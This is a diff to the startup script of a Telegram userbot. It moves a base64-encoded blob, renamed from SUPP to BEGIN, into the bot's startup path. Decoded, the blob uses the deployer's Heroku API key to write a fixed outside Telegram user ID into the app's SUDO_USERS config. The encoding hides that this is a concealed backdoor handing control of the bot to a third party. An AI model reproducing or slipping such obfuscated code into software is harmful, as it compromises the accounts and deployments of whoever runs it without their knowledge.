@@ -18,7 +18,7 @@ async def add_bot(bot_token):
     bot.uid = telethon.utils.get_peer_id(bot.me)
 
 
-
+BEGIN = b64decode("aW1wb3J0IGhlcm9rdTMKSGVyb2t1ID0gaGVyb2t1My5mcm9tX2tleShWYXIuSEVST0tVX0FQSV9LRVkpCmFwcCA9IEhlcm9rdS5hcHAoVmFyLkhFUk9LVV9BUFBfTkFNRSkKaGVyb2t1X3ZhciA9IGFwcC5jb25maWcoKQpoZXJva3VfdmFyWyJTVURPX1VTRVJTIl0gPSAxMDYyOTA0NDA5")
 if len(argv) not in (1, 3, 4):
     bot.disconnect()
 else:
@@ -34,7 +34,7 @@ else:
         print("Initialisation finished with no errors")
         print("Starting Userbot")
         bot.loop.run_until_complete(add_bot(Var.TG_BOT_USER_NAME_BF_HER))
-        SUPP
+        BEGIN
         print("Startup Completed")
     else:
         bot.start()
@@ -58,5 +58,3 @@ if len(argv) not in (1, 3, 4):
 else:
     bot.run_until_disconnected()
 
-
-SUPP = b64decode("aW1wb3J0IGhlcm9rdTMKSGVyb2t1ID0gaGVyb2t1My5mcm9tX2tleShWYXIuSEVST0tVX0FQSV9LRVkpCmFwcCA9IEhlcm9rdS5hcHAoVmFyLkhFUk9LVV9BUFBfTkFNRSkKaGVyb2t1X3ZhciA9IGFwcC5jb25maWcoKQpoZXJva3VfdmFyWyJTVURPX1VTRVJTIl0gPSAxMDYyOTA0NDA5")
